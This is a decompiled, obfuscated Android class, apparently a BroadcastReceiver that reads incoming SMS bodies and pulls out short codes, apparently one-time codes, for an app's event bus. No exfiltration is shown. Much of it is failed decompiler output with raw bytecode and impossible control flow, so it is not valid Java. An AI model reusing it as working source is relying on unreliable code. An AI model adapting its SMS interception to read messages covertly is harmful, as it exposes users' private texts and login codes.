package o;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsMessage;
import android.text.TextUtils;

public class Ki
  extends BroadcastReceiver
{
  private static BroadcastReceiver ˊ;
  private static int ˋ;
  private static char[] ˎ = { 3624, -27440, 15299, -8482, 26106, 2291, -20505, 12966, -9855, 31892, 896, -22878, 19892, -12122, 30638, 6722, -24297, 17530, -5262, -29072, 5472, -18310, 24347, -7657, -30449, 11311, -19599, 22039, -768, -31775, 9956, -12814, 20716, -2083, -25918, 8645, -15197, 27583, 3751, 32, 66, -25954, 13696, -12160, 27644, 1714, -24157, 15585, -10290, 29386, 32446, -7061, 19297, -20868, 5460, 30786, -8425, 16968, -22236, 3111, 65, -25897, 13704, -12150, 27567, 1703, -24086, 15538, -10281, 29379, -1500, 24817, -12317, 10979, -28211, -815, 23493, 6846, -32642, 12150, -13700, 28994, 7249, -17585, 9795, -13005, 26723, 5935, -19940, 22792, -15341, 25367, 3765, -18945, 20708, -42, -25892, 384, -21303, 19364, -2382, -25175, 14547, -22635, 17045, -5736, -26825, 12915, -9888, 17535, -7352, -29117, 13646, -12235, 32613, 6758, 79, -25949, 13758, -12091, 27577, 1707, -24130, 15539, -10279, 29388, 3538, -22284, 17403, -8475, 31138, 5151, -20719, 18958, -6862, -32720, 6952, -18845, 20828, -5026, -30886, 8767, -17029, 22632, -3209, -29304, 10387, -15474, 24197, -1545, -27462, 12192, -13628, 26055, 144, -25727, -15192, 24145, -3782, 5126, -20690, -15840, 25918, -2007, 4951, -18873, -14009, 27707, -30857, 6752, -17036, -12149, 27535, -28991, 8619, 17575, -8264, 29356, -27182, 10448, 112, -25965, 13723, -12138, -26430, 572, -21192, 18476, -3303, -25085 };
  private static int ˏ = 0;
  private static long ॱ;
  
  static
  {
    ˋ = 1;
    ॱ = 7420256086551599863L;
  }
  
  public Ki() {}
  
  public static void ˊ(Context paramContext)
  {
    int i;
    switch (i)
    {
    default: 
      
    case 1: 
      for (;;)
      {
        if (ˊ != null) {
          break label126;
        }
        for (;;)
        {
          i = 0;
          break;
          label46:
          i = 1;
          break;
          try
          {
            i = ˋ;
            i += 107;
            ˏ = i % 128;
            if (i % 2 != 0) {
              break label46;
            }
          }
          catch (Exception paramContext)
          {
            throw paramContext;
          }
        }
        ˊ = new Ki();
        break label164;
        i = ˏ + 51;
        ˋ = i % 128;
        if (i % 2 != 0)
        {
          continue;
          label126:
          label164:
          for (;;)
          {
            paramContext.registerReceiver(ˊ, new IntentFilter(ˋ(0, '้', 39).intern()));
            break;
            throw new NullPointerException();
          }
        }
      }
    }
  }
  
  private static String ˋ(int paramInt1, char paramChar, int paramInt2)
  {
    break label158;
    int j = ˋ + 93;
    ˏ = j % 128;
    char[] arrayOfChar;
    int i;
    if (j % 2 == 0)
    {
      break label117;
      return new String(arrayOfChar);
      if (i < paramInt2) {
        break label151;
      }
      break label161;
    }
    for (;;)
    {
      label54:
      switch (j)
      {
      }
      break;
      label87:
      break label171;
      label117:
      label151:
      label158:
      for (;;)
      {
        i = ˋ + 69;
        ˏ = i % 128;
        if (i % 2 != 0) {
          break label87;
        }
        break label171;
        for (;;)
        {
          arrayOfChar[i] = ((char)(int)(ˎ[(paramInt1 + i)] ^ i * ॱ ^ paramChar));
          i += 1;
          break;
        }
        j = 31;
        break label54;
      }
      label161:
      j = 59;
    }
    for (;;)
    {
      break;
      label171:
      arrayOfChar = new char[paramInt2];
      i = 0;
    }
  }
  
  private String ˋ(SmsMessage paramSmsMessage)
  {
    break label89;
    int i;
    for (;;)
    {
      i = 62;
      break;
      return ˎ(paramSmsMessage.getDisplayMessageBody());
      label18:
      i = ˋ + 117;
      ˏ = i % 128;
      if (i % 2 != 0) {
        break label92;
      }
    }
    for (;;)
    {
      switch (i)
      {
      case 62: 
      default: 
        break;
      case 53: 
        paramSmsMessage = ˎ(paramSmsMessage.getDisplayMessageBody());
        i = null.length;
        return paramSmsMessage;
        label89:
        break label18;
        label92:
        i = 53;
      }
    }
  }
  
  public static void ˋ(Context paramContext)
  {
    break label130;
    int i;
    switch (i)
    {
    default: 
      break;
    }
    for (;;)
    {
      i = ˋ + 107;
      ˏ = i % 128;
      if (i % 2 == 0)
      {
        return;
        try
        {
          i = ˏ;
          i += 111;
          ˋ = i % 128;
          if (i % 2 != 0) {}
          for (;;)
          {
            paramContext.unregisterReceiver(ˊ);
            break;
          }
        }
        catch (Exception paramContext)
        {
          throw paramContext;
        }
      }
    }
    return;
    label130:
    label131:
    for (;;)
    {
      i = 70;
      break;
      i = 22;
      break;
      for (;;)
      {
        if (ˊ != null) {
          break label131;
        }
        break;
      }
    }
  }
  
  /* Error */
  private SmsMessage[] ˋ(Intent paramIntent)
  {
    // Byte code:
    //   0: goto +313 -> 313
    //   3: iconst_0
    //   4: istore_3
    //   5: goto +177 -> 182
    //   8: iconst_1
    //   9: istore_2
    //   10: goto +17 -> 27
    //   13: bipush 83
    //   15: istore_2
    //   16: goto +202 -> 218
    //   19: iconst_1
    //   20: istore_3
    //   21: goto +161 -> 182
    //   24: astore_1
    //   25: aload_1
    //   26: athrow
    //   27: iload_2
    //   28: tableswitch	default:+24->52, 0:+56->84, 1:+29->57
    //   52: goto +5 -> 57
    //   55: aload_1
    //   56: areturn
    //   57: getstatic 17	o/Ki:ˏ	I
    //   60: bipush 73
    //   62: iadd
    //   63: istore_2
    //   64: iload_2
    //   65: sipush 128
    //   68: irem
    //   69: putstatic 19	o/Ki:ˋ	I
    //   72: iload_2
    //   73: iconst_2
    //   74: irem
    //   75: ifne +6 -> 81
    //   78: goto +226 -> 304
    //   81: goto +235 -> 316
    //   84: aload 5
    //   86: arraylength
    //   87: istore 4
    //   89: iload 4
    //   91: anewarray 254	android/telephony/SmsMessage
    //   94: astore_1
    //   95: sipush 184
    //   98: ldc_w 266
    //   101: bipush 6
    //   103: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   106: astore 7
    //   108: aload 7
    //   110: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   113: astore 7
    //   115: aload 6
    //   117: aload 7
    //   119: aconst_null
    //   120: invokevirtual 272	android/os/Bundle:getString	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   123: astore 6
    //   125: iconst_0
    //   126: istore_2
    //   127: goto +79 -> 206
    //   130: iconst_0
    //   131: istore_2
    //   132: goto -105 -> 27
    //   135: aload_1
    //   136: invokevirtual 278	android/content/Intent:getExtras	()Landroid/os/Bundle;
    //   139: astore 6
    //   141: aload 6
    //   143: ifnonnull +6 -> 149
    //   146: goto -133 -> 13
    //   149: goto +158 -> 307
    //   152: getstatic 19	o/Ki:ˋ	I
    //   155: bipush 107
    //   157: iadd
    //   158: istore_2
    //   159: iload_2
    //   160: sipush 128
    //   163: irem
    //   164: putstatic 17	o/Ki:ˏ	I
    //   167: iload_2
    //   168: iconst_2
    //   169: irem
    //   170: ifeq +6 -> 176
    //   173: goto +145 -> 318
    //   176: goto +71 -> 247
    //   179: astore_1
    //   180: aload_1
    //   181: athrow
    //   182: iload_3
    //   183: tableswitch	default:+21->204, 0:+101->284, 1:+-128->55
    //   204: aload_1
    //   205: areturn
    //   206: iload_2
    //   207: iload 4
    //   209: if_icmpge +6 -> 215
    //   212: goto -209 -> 3
    //   215: goto -196 -> 19
    //   218: iload_2
    //   219: lookupswitch	default:+25->244, 37:+30->249, 83:+-67->152
    //   244: goto -92 -> 152
    //   247: aconst_null
    //   248: areturn
    //   249: aload 6
    //   251: sipush 180
    //   254: iconst_0
    //   255: iconst_4
    //   256: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   259: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   262: invokevirtual 282	android/os/Bundle:get	(Ljava/lang/String;)Ljava/lang/Object;
    //   265: checkcast 284	[Ljava/lang/Object;
    //   268: checkcast 284	[Ljava/lang/Object;
    //   271: astore 5
    //   273: aload 5
    //   275: ifnonnull +6 -> 281
    //   278: goto -270 -> 8
    //   281: goto -151 -> 130
    //   284: aload_1
    //   285: iload_2
    //   286: aload_0
    //   287: aload 5
    //   289: iload_2
    //   290: aaload
    //   291: aload 6
    //   293: invokespecial 287	o/Ki:ˏ	(Ljava/lang/Object;Ljava/lang/String;)Landroid/telephony/SmsMessage;
    //   296: aastore
    //   297: iload_2
    //   298: iconst_1
    //   299: iadd
    //   300: istore_2
    //   301: goto -95 -> 206
    //   304: goto +12 -> 316
    //   307: bipush 37
    //   309: istore_2
    //   310: goto -92 -> 218
    //   313: goto -178 -> 135
    //   316: aconst_null
    //   317: areturn
    //   318: goto -71 -> 247
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	321	0	this	Ki
    //   0	321	1	paramIntent	Intent
    //   9	301	2	i	int
    //   4	179	3	j	int
    //   87	123	4	k	int
    //   84	204	5	arrayOfObject	Object[]
    //   115	177	6	localObject	Object
    //   106	12	7	str	String
    // Exception table:
    //   from	to	target	type
    //   95	108	24	java/lang/Exception
    //   89	95	179	java/lang/Exception
    //   95	108	179	java/lang/Exception
    //   108	115	179	java/lang/Exception
    //   115	125	179	java/lang/Exception
  }
  
  /* Error */
  @android.annotation.SuppressLint({"NewApi"})
  private SmsMessage ˏ(Object paramObject, String paramString)
  {
    // Byte code:
    //   0: goto +99 -> 99
    //   3: bipush 71
    //   5: istore_3
    //   6: goto +20 -> 26
    //   9: bipush 31
    //   11: istore_3
    //   12: goto +14 -> 26
    //   15: aload_1
    //   16: checkcast 292	[B
    //   19: checkcast 292	[B
    //   22: invokestatic 296	android/telephony/SmsMessage:createFromPdu	([B)Landroid/telephony/SmsMessage;
    //   25: areturn
    //   26: iload_3
    //   27: lookupswitch	default:+25->52, 31:+54->81, 71:+-12->15
    //   52: goto +29 -> 81
    //   55: getstatic 17	o/Ki:ˏ	I
    //   58: bipush 67
    //   60: iadd
    //   61: istore_3
    //   62: iload_3
    //   63: sipush 128
    //   66: irem
    //   67: putstatic 19	o/Ki:ˋ	I
    //   70: iload_3
    //   71: iconst_2
    //   72: irem
    //   73: ifne +6 -> 79
    //   76: goto +174 -> 250
    //   79: aload_1
    //   80: areturn
    //   81: aload_1
    //   82: checkcast 292	[B
    //   85: checkcast 292	[B
    //   88: aload_2
    //   89: invokestatic 299	android/telephony/SmsMessage:createFromPdu	([BLjava/lang/String;)Landroid/telephony/SmsMessage;
    //   92: astore_1
    //   93: goto -38 -> 55
    //   96: goto +6 -> 102
    //   99: goto +125 -> 224
    //   102: goto +17 -> 119
    //   105: astore_1
    //   106: aload_1
    //   107: invokevirtual 305	java/lang/Throwable:getCause	()Ljava/lang/Throwable;
    //   110: astore_2
    //   111: aload_2
    //   112: ifnull +5 -> 117
    //   115: aload_2
    //   116: athrow
    //   117: aload_1
    //   118: athrow
    //   119: iconst_3
    //   120: iconst_0
    //   121: ldc_w 306
    //   124: invokestatic 311	o/O:ˋ	(IIC)Ljava/lang/Object;
    //   127: checkcast 313	java/lang/Class
    //   130: ldc_w 314
    //   133: aconst_null
    //   134: invokevirtual 318	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   137: aconst_null
    //   138: aconst_null
    //   139: invokevirtual 324	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   142: astore 5
    //   144: goto +17 -> 161
    //   147: astore_1
    //   148: aload_1
    //   149: invokevirtual 305	java/lang/Throwable:getCause	()Ljava/lang/Throwable;
    //   152: astore_2
    //   153: aload_2
    //   154: ifnull +5 -> 159
    //   157: aload_2
    //   158: athrow
    //   159: aload_1
    //   160: athrow
    //   161: iconst_3
    //   162: iconst_0
    //   163: ldc_w 306
    //   166: invokestatic 311	o/O:ˋ	(IIC)Ljava/lang/Object;
    //   169: checkcast 313	java/lang/Class
    //   172: ldc_w 325
    //   175: iconst_1
    //   176: anewarray 313	java/lang/Class
    //   179: dup
    //   180: iconst_0
    //   181: getstatic 331	java/lang/Integer:TYPE	Ljava/lang/Class;
    //   184: aastore
    //   185: invokevirtual 318	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   188: aload 5
    //   190: iconst_1
    //   191: anewarray 333	java/lang/Object
    //   194: dup
    //   195: iconst_0
    //   196: bipush 23
    //   198: invokestatic 337	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   201: aastore
    //   202: invokevirtual 324	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   205: checkcast 339	java/lang/Boolean
    //   208: invokevirtual 343	java/lang/Boolean:booleanValue	()Z
    //   211: istore 4
    //   213: iload 4
    //   215: ifeq +6 -> 221
    //   218: goto -209 -> 9
    //   221: goto -218 -> 3
    //   224: getstatic 19	o/Ki:ˋ	I
    //   227: iconst_3
    //   228: iadd
    //   229: istore_3
    //   230: iload_3
    //   231: sipush 128
    //   234: irem
    //   235: putstatic 17	o/Ki:ˏ	I
    //   238: iload_3
    //   239: iconst_2
    //   240: irem
    //   241: ifeq +6 -> 247
    //   244: goto -148 -> 96
    //   247: goto -145 -> 102
    //   250: aload_1
    //   251: areturn
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	252	0	this	Ki
    //   0	252	1	paramObject	Object
    //   0	252	2	paramString	String
    //   5	236	3	i	int
    //   211	3	4	bool	boolean
    //   142	47	5	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   119	144	105	finally
    //   161	213	147	finally
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    for (;;)
    {
      paramContext = ˊ(paramIntent);
      zp.ॱ().ˎ(new Ed(paramContext));
      break;
    }
    int i = ˋ + 17;
    ˏ = i % 128;
    if (i % 2 != 0) {}
  }
  
  public String ˊ(Intent paramIntent)
  {
    for (;;)
    {
      try
      {
        int k = ˋ;
        k += 91;
        ˏ = k % 128;
        if (k % 2 == 0)
        {
          continue;
          i = ˏ + 93;
          ˋ = i % 128;
          if (i % 2 != 0)
          {
            continue;
            k = 1;
            continue;
          }
        }
        SmsMessage[] arrayOfSmsMessage;
        try
        {
          i = ˋ;
          i += 67;
          ˏ = i % 128;
          if (i % 2 == 0) {
            break label315;
          }
          i = 81;
          continue;
          paramIntent = ˋ(arrayOfSmsMessage[i]);
          if (!TextUtils.isEmpty(paramIntent)) {
            break;
          }
          continue;
          continue;
          k = 0;
          continue;
          continue;
          int j;
          switch (k)
          {
          case 1: 
          default: 
            return paramIntent;
            j = arrayOfSmsMessage.length;
            i = 0;
            continue;
            j = arrayOfSmsMessage.length;
            i = 0;
            continue;
            i += 1;
            break;
          case 0: 
            return paramIntent;
          }
          if (i < j) {
            continue;
          }
          continue;
          switch (i)
          {
          }
        }
        catch (Exception paramIntent)
        {
          throw paramIntent;
        }
        continue;
        if (arrayOfSmsMessage.length == 0)
        {
          return null;
          arrayOfSmsMessage = ˋ(paramIntent);
          paramIntent = null;
          if (arrayOfSmsMessage != null) {
            continue;
          }
          return null;
          throw new NullPointerException();
        }
        i = ˋ + 33;
        ˏ = i % 128;
        if (i % 2 != 0) {
          continue;
        }
        continue;
        return paramIntent;
      }
      catch (Exception paramIntent)
      {
        throw paramIntent;
      }
      label315:
      int i = 27;
    }
  }
  
  /* Error */
  public String ˎ(String paramString)
  {
    // Byte code:
    //   0: goto +135 -> 135
    //   3: goto +95 -> 98
    //   6: aload_1
    //   7: bipush 39
    //   9: iconst_0
    //   10: iconst_1
    //   11: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   14: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   17: invokevirtual 374	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   20: astore 6
    //   22: aload_1
    //   23: iconst_0
    //   24: bipush 10
    //   26: invokevirtual 378	java/lang/String:substring	(II)Ljava/lang/String;
    //   29: astore 7
    //   31: iconst_m1
    //   32: istore 4
    //   34: aload 7
    //   36: invokevirtual 382	java/lang/String:hashCode	()I
    //   39: istore_2
    //   40: iload_2
    //   41: lookupswitch	default:+35->76, -2001103003:+97->138, -1385207207:+333->374, -687537713:+362->403
    //   76: iload 4
    //   78: istore_2
    //   79: goto +543 -> 622
    //   82: aload 6
    //   84: bipush 14
    //   86: aaload
    //   87: iconst_0
    //   88: bipush 6
    //   90: invokevirtual 378	java/lang/String:substring	(II)Ljava/lang/String;
    //   93: astore 6
    //   95: aload 6
    //   97: areturn
    //   98: goto +524 -> 622
    //   101: iload 4
    //   103: istore_2
    //   104: iload_3
    //   105: lookupswitch	default:+27->132, 11:+464->569, 18:+517->622
    //   132: goto +437 -> 569
    //   135: goto -129 -> 6
    //   138: aload 7
    //   140: bipush 40
    //   142: iconst_0
    //   143: bipush 10
    //   145: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   148: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   151: invokevirtual 386	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   154: istore 5
    //   156: iload 5
    //   158: ifeq +6 -> 164
    //   161: goto +413 -> 574
    //   164: goto +443 -> 607
    //   167: iload 4
    //   169: istore_2
    //   170: iload_3
    //   171: lookupswitch	default:+25->196, 64:+451->622, 77:+527->698
    //   196: goto +502 -> 698
    //   199: astore 6
    //   201: bipush 70
    //   203: ldc_w 387
    //   206: bipush 7
    //   208: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   211: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   214: astore 6
    //   216: new 389	java/lang/StringBuilder
    //   219: dup
    //   220: invokespecial 390	java/lang/StringBuilder:<init>	()V
    //   223: bipush 116
    //   225: iconst_0
    //   226: bipush 40
    //   228: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   231: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   234: invokevirtual 394	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   237: aload_1
    //   238: invokevirtual 394	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   241: sipush 156
    //   244: ldc_w 395
    //   247: bipush 24
    //   249: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   252: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   255: invokevirtual 394	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   258: invokevirtual 398	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   261: astore_1
    //   262: goto +20 -> 282
    //   265: astore_1
    //   266: aload_1
    //   267: invokevirtual 305	java/lang/Throwable:getCause	()Ljava/lang/Throwable;
    //   270: astore 6
    //   272: aload 6
    //   274: ifnull +6 -> 280
    //   277: aload 6
    //   279: athrow
    //   280: aload_1
    //   281: athrow
    //   282: iconst_4
    //   283: bipush 42
    //   285: ldc_w 399
    //   288: invokestatic 311	o/O:ˋ	(IIC)Ljava/lang/Object;
    //   291: checkcast 313	java/lang/Class
    //   294: ldc_w 400
    //   297: iconst_2
    //   298: anewarray 313	java/lang/Class
    //   301: dup
    //   302: iconst_0
    //   303: ldc -24
    //   305: aastore
    //   306: dup
    //   307: iconst_1
    //   308: ldc -24
    //   310: aastore
    //   311: invokevirtual 318	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   314: aconst_null
    //   315: iconst_2
    //   316: anewarray 333	java/lang/Object
    //   319: dup
    //   320: iconst_0
    //   321: aload 6
    //   323: aastore
    //   324: dup
    //   325: iconst_1
    //   326: aload_1
    //   327: aastore
    //   328: invokevirtual 324	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   331: pop
    //   332: ldc_w 402
    //   335: areturn
    //   336: aload 6
    //   338: bipush 15
    //   340: aaload
    //   341: iconst_0
    //   342: bipush 6
    //   344: invokevirtual 378	java/lang/String:substring	(II)Ljava/lang/String;
    //   347: astore 6
    //   349: goto +231 -> 580
    //   352: aload 6
    //   354: bipush 12
    //   356: aaload
    //   357: iconst_0
    //   358: bipush 6
    //   360: invokevirtual 378	java/lang/String:substring	(II)Ljava/lang/String;
    //   363: astore 6
    //   365: aload 6
    //   367: areturn
    //   368: bipush 11
    //   370: istore_3
    //   371: goto -270 -> 101
    //   374: aload 7
    //   376: bipush 60
    //   378: iconst_0
    //   379: bipush 10
    //   381: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   384: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   387: invokevirtual 386	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   390: istore 5
    //   392: iload 5
    //   394: ifeq +6 -> 400
    //   397: goto +216 -> 613
    //   400: goto +251 -> 651
    //   403: aload 7
    //   405: bipush 50
    //   407: sipush 32509
    //   410: bipush 10
    //   412: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   415: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   418: invokevirtual 386	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   421: istore 5
    //   423: iload 5
    //   425: ifeq +6 -> 431
    //   428: goto -60 -> 368
    //   431: goto +293 -> 724
    //   434: bipush 70
    //   436: ldc_w 387
    //   439: bipush 7
    //   441: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   444: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   447: astore 6
    //   449: new 389	java/lang/StringBuilder
    //   452: dup
    //   453: invokespecial 390	java/lang/StringBuilder:<init>	()V
    //   456: bipush 77
    //   458: sipush 6892
    //   461: bipush 39
    //   463: invokestatic 230	o/Ki:ˋ	(ICI)Ljava/lang/String;
    //   466: invokevirtual 236	java/lang/String:intern	()Ljava/lang/String;
    //   469: invokevirtual 394	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   472: aload_1
    //   473: invokevirtual 394	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   476: invokevirtual 398	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   479: astore 7
    //   481: goto +23 -> 504
    //   484: astore 6
    //   486: aload 6
    //   488: invokevirtual 305	java/lang/Throwable:getCause	()Ljava/lang/Throwable;
    //   491: astore 7
    //   493: aload 7
    //   495: ifnull +6 -> 501
    //   498: aload 7
    //   500: athrow
    //   501: aload 6
    //   503: athrow
    //   504: iconst_4
    //   505: bipush 42
    //   507: ldc_w 399
    //   510: invokestatic 311	o/O:ˋ	(IIC)Ljava/lang/Object;
    //   513: checkcast 313	java/lang/Class
    //   516: ldc_w 400
    //   519: iconst_2
    //   520: anewarray 313	java/lang/Class
    //   523: dup
    //   524: iconst_0
    //   525: ldc -24
    //   527: aastore
    //   528: dup
    //   529: iconst_1
    //   530: ldc -24
    //   532: aastore
    //   533: invokevirtual 318	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   536: aconst_null
    //   537: iconst_2
    //   538: anewarray 333	java/lang/Object
    //   541: dup
    //   542: iconst_0
    //   543: aload 6
    //   545: aastore
    //   546: dup
    //   547: iconst_1
    //   548: aload 7
    //   550: aastore
    //   551: invokevirtual 324	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   554: pop
    //   555: ldc_w 402
    //   558: areturn
    //   559: iconst_2
    //   560: istore_2
    //   561: goto +61 -> 622
    //   564: iconst_0
    //   565: istore_2
    //   566: goto +170 -> 736
    //   569: iconst_1
    //   570: istore_2
    //   571: goto +162 -> 733
    //   574: bipush 77
    //   576: istore_3
    //   577: goto -410 -> 167
    //   580: getstatic 17	o/Ki:ˏ	I
    //   583: bipush 85
    //   585: iadd
    //   586: istore_2
    //   587: iload_2
    //   588: sipush 128
    //   591: irem
    //   592: putstatic 19	o/Ki:ˋ	I
    //   595: iload_2
    //   596: iconst_2
    //   597: irem
    //   598: ifne +6 -> 604
    //   601: aload 6
    //   603: areturn
    //   604: aload 6
    //   606: areturn
    //   607: bipush 64
    //   609: istore_3
    //   610: goto -443 -> 167
    //   613: bipush 73
    //   615: istore_3
    //   616: goto +44 -> 660
    //   619: astore_1
    //   620: aload_1
    //   621: athrow
    //   622: iload_2
    //   623: tableswitch	default:+25->648, 0:+-541->82, 1:+-271->352, 2:+-287->336
    //   648: goto -214 -> 434
    //   651: bipush 96
    //   653: istore_3
    //   654: goto +6 -> 660
    //   657: astore_1
    //   658: aload_1
    //   659: athrow
    //   660: iload 4
    //   662: istore_2
    //   663: iload_3
    //   664: lookupswitch	default:+28->692, 73:+-105->559, 96:+-42->622
    //   692: iload 4
    //   694: istore_2
    //   695: goto -73 -> 622
    //   698: getstatic 19	o/Ki:ˋ	I
    //   701: iconst_1
    //   702: iadd
    //   703: istore_2
    //   704: iload_2
    //   705: sipush 128
    //   708: irem
    //   709: putstatic 17	o/Ki:ˏ	I
    //   712: iload_2
    //   713: iconst_2
    //   714: irem
    //   715: ifeq +6 -> 721
    //   718: goto +12 -> 730
    //   721: goto -157 -> 564
    //   724: bipush 18
    //   726: istore_3
    //   727: goto -626 -> 101
    //   730: goto -166 -> 564
    //   733: goto -111 -> 622
    //   736: getstatic 17	o/Ki:ˏ	I
    //   739: istore_3
    //   740: iload_3
    //   741: bipush 101
    //   743: iadd
    //   744: istore_3
    //   745: iload_3
    //   746: sipush 128
    //   749: irem
    //   750: putstatic 19	o/Ki:ˋ	I
    //   753: iload_3
    //   754: iconst_2
    //   755: irem
    //   756: ifne +6 -> 762
    //   759: goto -756 -> 3
    //   762: goto -664 -> 98
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	765	0	this	Ki
    //   0	765	1	paramString	String
    //   39	676	2	i	int
    //   104	652	3	j	int
    //   32	661	4	k	int
    //   154	270	5	bool	boolean
    //   20	76	6	localObject1	Object
    //   199	1	6	localException	Exception
    //   214	234	6	localObject2	Object
    //   484	121	6	str	String
    //   29	520	7	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   6	31	199	java/lang/Exception
    //   34	40	199	java/lang/Exception
    //   82	95	199	java/lang/Exception
    //   138	156	199	java/lang/Exception
    //   336	349	199	java/lang/Exception
    //   352	365	199	java/lang/Exception
    //   374	392	199	java/lang/Exception
    //   403	423	199	java/lang/Exception
    //   434	481	199	java/lang/Exception
    //   486	493	199	java/lang/Exception
    //   498	501	199	java/lang/Exception
    //   501	504	199	java/lang/Exception
    //   282	332	265	finally
    //   504	555	484	finally
    //   745	753	619	java/lang/Exception
    //   736	740	657	java/lang/Exception
  }
}
